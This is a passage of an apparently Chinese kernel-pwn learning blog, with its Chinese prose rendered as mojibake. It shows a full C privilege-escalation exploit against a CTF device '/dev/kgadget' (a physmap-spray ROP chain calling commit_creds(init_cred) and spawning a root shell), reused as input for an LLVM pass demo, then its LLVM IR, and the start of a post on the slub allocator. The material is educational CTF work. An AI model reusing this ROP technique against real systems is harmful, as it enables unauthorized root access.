class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-7.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF810C92E0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF82A6B700</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81C00FB0</span> + <span class="number">0x1B</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> ret = <span class="number">0xFFFFFFFF810001FC</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> poprdi_ret = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> poprsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">long</span> page_size;</span><br><span class="line"><span class="type">size_t</span>* map_spray[<span class="number">16000</span>];</span><br><span class="line"><span class="type">size_t</span> guess;</span><br><span class="line"><span class="type">int</span> dev;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    info_log(<span class="string">&quot;Status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>* error_info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Fatal Error: %s\033[0m\n&quot;</span>, error_info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33m\033[1m[*] Info: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Success: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    info_log(<span class="string">&quot;Ready to get root......&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">        error_log(<span class="string">&quot;Failed to get root!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    success_log(<span class="string">&quot;Root got!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>* space)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>); index++)</span><br><span class="line">        space[index] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; (page_size / <span class="number">8</span> - <span class="number">0x10</span>); index++)</span><br><span class="line">        space[index] = ret;</span><br><span class="line">    space[index++] = poprdi_ret;</span><br><span class="line">    space[index++] = init_cred;</span><br><span class="line">    space[index++] = commit_creds;</span><br><span class="line">    space[index++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">    space[index++] = user_cs;</span><br><span class="line">    space[index++] = user_rflags;</span><br><span class="line">    space[index++] = user_sp;</span><br><span class="line">    space[index] = user_ss;</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Spray content below:&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)space, page_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    dev = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev &lt; <span class="number">0</span>)     <span class="comment">// failed to open key device, an unexpected error</span></span><br><span class="line">        error_log(<span class="string">&quot;Cannot open device \&quot;/dev/kgadget\&quot;!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);      <span class="comment">// the size of a page, namely 4096 bytes</span></span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Spraying physmap......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    map_spray[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    makeROP(map_spray[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">15000</span>; i++)&#123;</span><br><span class="line">        map_spray[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(!map_spray[i])</span><br><span class="line">            error_log(<span class="string">&quot;Mmap Failure!&quot;</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(map_spray[i], map_spray[<span class="number">0</span>], page_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    guess = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Ready to turn to kernel......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    __asm__(<span class="string">&quot;mov r15, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, 0x12345678;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, 0x87654321;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, poprsp_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8, guess;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rcx, 0x12345678;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, guess;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, 0x1bf52;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, dev;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç”¨ä¸‹é¢çš„å‘½ä»¤å¯ä»¥ç”Ÿæˆ.llæ–‡ä»¶å‡†å¤‡è¾“å…¥åˆ°LLVMä¸­ï¼š<code>clang -emit-llvm -S firstLLVMtest.c -o firstLLVMtest.ll</code></p>
<p>ç”Ÿæˆçš„.llæ–‡ä»¶çš„å‰é¢ä¸€éƒ¨åˆ†å†…å®¹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;firstLLVMtest.c&#x27;</span><br><span class="line">source_filename = &quot;firstLLVMtest.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@commit_creds = dso_local constant i64 -2129882400, align 8</span><br><span class="line">@init_cred = dso_local constant i64 -2103003392, align 8</span><br><span class="line">@swapgs_restore_regs_and_return_to_usermode = dso_local constant i64 -2118119477, align 8</span><br><span class="line">@ret = dso_local constant i64 -2130705924, align 8</span><br><span class="line">@poprdi_ret = dso_local constant i64 -2130131216, align 8</span><br><span class="line">@poprsp_ret = dso_local constant i64 -2129361968, align 8</span><br><span class="line">@add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = dso_local constant i64 -2130233346, align 8</span><br><span class="line">@.str = private unnamed_addr constant [23 x i8] c&quot;Status has been saved.\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [5 x i8] c&quot;%#5x\00&quot;, align 1</span><br><span class="line">@.str.2 = private unnamed_addr constant [4 x i8] c&quot;   \00&quot;, align 1</span><br><span class="line">@.str.3 = private unnamed_addr constant [6 x i8] c&quot;%02x \00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [4 x i8] c&quot;%s\0A\00&quot;, align 1</span><br><span class="line">@.str.5 = private unnamed_addr constant [34 x i8] c&quot;\1B[31m\1B[1m[x] Fatal Error: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.6 = private unnamed_addr constant [27 x i8] c&quot;\1B[33m\1B[1m[*] Info: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.7 = private unnamed_addr constant [30 x i8] c&quot;\1B[32m\1B[1m[+] Success: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.8 = private unnamed_addr constant [24 x i8] c&quot;Ready to get root......\00&quot;, align 1</span><br><span class="line">@.str.9 = private unnamed_addr constant [20 x i8] c&quot;Failed to get root!\00&quot;, align 1</span><br><span class="line">@.str.10 = private unnamed_addr constant [10 x i8] c&quot;Root got!\00&quot;, align 1</span><br><span class="line">@.str.11 = private unnamed_addr constant [8 x i8] c&quot;/bin/sh\00&quot;, align 1</span><br><span class="line">@page_size = common dso_local global i64 0, align 8</span><br><span class="line">@user_cs = common dso_local global i64 0, align 8</span><br><span class="line">@user_rflags = common dso_local global i64 0, align 8</span><br><span class="line">@user_sp = common dso_local global i64 0, align 8</span><br><span class="line">@user_ss = common dso_local global i64 0, align 8</span><br><span class="line">@.str.12 = private unnamed_addr constant [21 x i8] c&quot;Spray content below:\00&quot;, align 1</span><br><span class="line">@.str.13 = private unnamed_addr constant [13 x i8] c&quot;/dev/kgadget\00&quot;, align 1</span><br><span class="line">@dev = common dso_local global i32 0, align 4</span><br><span class="line">@.str.14 = private unnamed_addr constant [35 x i8] c&quot;Cannot open device \22/dev/kgadget\22!\00&quot;, align 1</span><br><span class="line">@.str.15 = private unnamed_addr constant [23 x i8] c&quot;Spraying physmap......\00&quot;, align 1</span><br><span class="line">@map_spray = common dso_local global [16000 x i64*] zeroinitializer, align 16</span><br><span class="line">@.str.16 = private unnamed_addr constant [14 x i8] c&quot;Mmap Failure!\00&quot;, align 1</span><br><span class="line">@guess = common dso_local global i64 0, align 8</span><br><span class="line">@.str.17 = private unnamed_addr constant [30 x i8] c&quot;Ready to turn to kernel......\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @save_status() #0 &#123;</span><br><span class="line">  call void asm sideeffect &quot;mov user_cs, cs;mov user_ss, ss;mov user_sp, rsp;pushf;pop user_rflags;&quot;, &quot;~&#123;dirflag&#125;,~&#123;fpsr&#125;,~&#123;flags&#125;&quot;() #6, !srcloc !2</span><br><span class="line">  call void @info_log(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @info_log(i8* %0) #0 &#123;</span><br><span class="line">  %2 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %2, align 8</span><br><span class="line">  %3 = load i8*, i8** %2, align 8</span><br><span class="line">  %4 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0), i8* %3)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„ä»£ç æ˜¯å¯è¯»çš„ï¼Œç”¨å¦å¤–ä¸€ç§æ–¹å¼é˜è¿°äº†ä»£ç çš„æ‰§è¡Œæµç¨‹ã€‚</p>
<p>ç„¶åä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ç”Ÿæˆ.soæ–‡ä»¶ï¼Œ<a target="_blank" rel="noopener" href="http://xn--LLVMLLVMFirst-ho1u05k87q6l3chnf7ltr62gj0zg.so">ä½œä¸ºLLVMçš„åŠ¨æ€é“¾æ¥åº“LLVMFirst.so</a>ï¼š<br />
<code>clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared myFirstLLVMpass.cpp -o LLVMFirst.so `llvm-config --ldflags</code></p>
<p>æœ€åç”¨ä¸‹é¢çš„å‘½ä»¤å°†.llæ–‡ä»¶è¾“å…¥åˆ°LLVMä¸­ï¼Œå¦‚æœæƒ³è¦å¾—åˆ°ç»“æœå¯ä»¥åœ¨åé¢æ·»åŠ <code>&gt; [æ–‡ä»¶å]</code>æ¥è·å–ï¼š<br />
<code>opt -load ./LLVMFirst.so -hello ./firstLLVMtest.ll</code></p>
<p>å…¶æ‰§è¡Œç»“æœä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WARNING: You&#x27;re attempting to print out a bitcode file.</span><br><span class="line">This is inadvisable as it may cause display problems. If</span><br><span class="line">you REALLY want to taste LLVM bitcode first-hand, you</span><br><span class="line">can force output with the `-f&#x27; option.</span><br><span class="line"></span><br><span class="line">Hello: save_status</span><br><span class="line">Hello: info_log</span><br><span class="line">Hello: print_binary</span><br><span class="line">Hello: error_log</span><br><span class="line">Hello: success_log</span><br><span class="line">Hello: getShell</span><br><span class="line">Hello: makeROP</span><br><span class="line">Hello: main</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°è¾“å‡ºäº†å¾ˆå¤šHelloå¼€å¤´çš„è¡Œï¼Œè¿™æ˜¯å› ä¸ºåœ¨ä¸Šé¢çš„C++ç¨‹åºä¸­ï¼Œæˆ‘ä»¬åœ¨åŒ¿åå‘½åç©ºé—´ä¸­é‡è½½äº†runOnFunctionå‡½æ•°ï¼Œè®©LLVMè¾“å‡ºHelloä¹‹åå†è¾“å‡ºå‡½æ•°çš„åå­—ï¼Œè¿™æ ·å°±æœ‰äº†ä¸Šé¢çš„å‡ è¡Œã€‚</p>
<p>åœ¨LLVM passä¸­å¯ä»¥å¯¹å‡½æ•°ã€å‡½æ•°ä¸­çš„å¾ªç¯ã€å‡½æ•°ä¸­çš„æ“ä½œæŒ‡ä»¤ç­‰ä¸€ç³»åˆ—å¯¹è±¡è¿›è¡Œè®°å½•ã€ä¿®æ”¹ç­‰å„ç§æ“ä½œï¼Œå…·ä½“çš„æ“ä½œç±»å‚è§<a target="_blank" rel="noopener" href="https://blog.csdn.net/mamamama811/article/details/110165333?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165736882716782246435214%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165736882716782246435214&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-110165333-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&amp;utm_term=llvm%20pass&amp;spm=1018.2226.3001.4187">èµ„æ–™</a>ã€‚åœ¨ä¸‹ä¸€ç¯‡æ–‡ç« ä¸­ç¬”è€…ä¼šè¯¦ç»†åˆ†æä¸€é“é¢˜ï¼Œè¿‡ä¸€ä¸‹LLVM passç±»pwné¢˜çš„æµç¨‹ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-8/" class="post-title-link" itemprop="url">Kernel pwn å…¥é—¨ (8)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:34:41" itemprop="dateCreated datePublished" datetime="2023-02-28T22:34:41+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:43" itemprop="dateModified" datetime="2023-03-01T11:30:43+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ ç¬”è®°</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn ç³»åˆ—</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>9.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>åœ¨æœ¬ç¯‡æ–‡ç« ä¸­ç¬”è€…ä¸æ‰“ç®—åˆ†æé¢˜ç›®ï¼Œè€Œæ˜¯å¯¹Linuxä¸­çš„slubç³»ç»Ÿè¿›è¡Œæ·±å…¥çš„å­¦ä¹ ä¸åˆ†æã€‚</p>
<p>å‚è€ƒèµ„æ–™ï¼šä¸Šä¸€ç¯‡æ–‡ç« ä¸­æåˆ°çš„ä¸‰ç¯‡ä¸kernelå†…å­˜åˆ†é…æœ‰å…³çš„æ–‡ç« ã€‚åœ¨é˜…è¯»æœ¬æ–‡æ—¶ï¼Œå»ºè®®ä¸è¿™ä¸‰ç¯‡æ–‡ç« å¯¹ç…§é£Ÿç”¨ã€‚</p>
<h1 id="1-ä¼™ä¼´ç³»ç»Ÿé‡æ¸©"><a class="markdownIt-Anchor" href="#1-ä¼™ä¼´ç³»ç»Ÿé‡æ¸©"></a> 1. ä¼™ä¼´ç³»ç»Ÿé‡æ¸©</h1>
<p>slubä½œä¸ºå°å—å†…å­˜çš„åˆ†é…å™¨ï¼Œå…¶åœ¨ä¼™ä¼´ç³»ç»Ÿä¹‹ä¸‹è¿ä½œï¼Œå› æ­¤é¦–å…ˆæˆ‘ä»¬è¿˜æ˜¯æ¥å›é¡¾ä¸€ä¸‹ä¼™ä¼´ç³»ç»Ÿã€‚</p>
<p>åœ¨ç¬¬4ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬ç®€å•ä»‹ç»äº†ä¼™ä¼´ç³»ç»Ÿçš„è¿ä½œæœºç†ï¼Œä»¥é¡µä¸ºå•ä½è¿›è¡Œå¤§å—å†…å­˜ç©ºé—´çš„åˆ†é…ä¸é‡Šæ”¾ã€‚å…¶å…·ä½“çš„æ•°æ®ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
